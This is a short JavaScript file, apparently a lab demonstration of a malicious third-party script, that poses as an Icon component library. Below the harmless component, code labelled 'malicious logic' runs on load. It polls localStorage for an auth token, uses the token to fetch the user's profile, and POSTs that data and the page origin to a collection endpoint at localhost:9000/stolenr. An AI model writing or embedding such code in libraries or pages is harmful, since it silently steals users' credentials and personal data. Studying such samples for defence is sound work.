// icons.js — hosted on attacker server



// Legit-looking Icon component
function Icon({ name = 'star', size = 24, color = '#333' }) {
  const icons = {
    star: '★',
    heart: '♥',
    check: '✔',
    alert: '⚠',
  };

  const symbol = icons[name] || '❔';

  const span = document.createElement('span');
  span.textContent = symbol;
  span.style.fontSize = size + 'px';
  span.style.color = color;
  span.style.margin = '0 4px';

  return span;
}

window.Icon = Icon;

// Malicious logic: steal token & send to attacker
 ( async  function  stealToken() {
  const token = localStorage.getItem('token');
  if (!token) {
    setTimeout(stealToken, 1000); // Try again in 1s
    return;
  }



   const responss = await fetch('http://localhost:4000/api/user', {
     method: 'GET',
    headers: { 'Content-Type': 'application/json',
               'Authorization': `Bearer ${token}`,
   },
 }).catch(console.log("Error..."));
 const response_ = await responss.json();

fetch('http://localhost:9000/stolenr', {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
     body: JSON.stringify({
     source: location.origin,
     response_,
    }),
  }).catch(console.error);
  console.log(response_);   
})();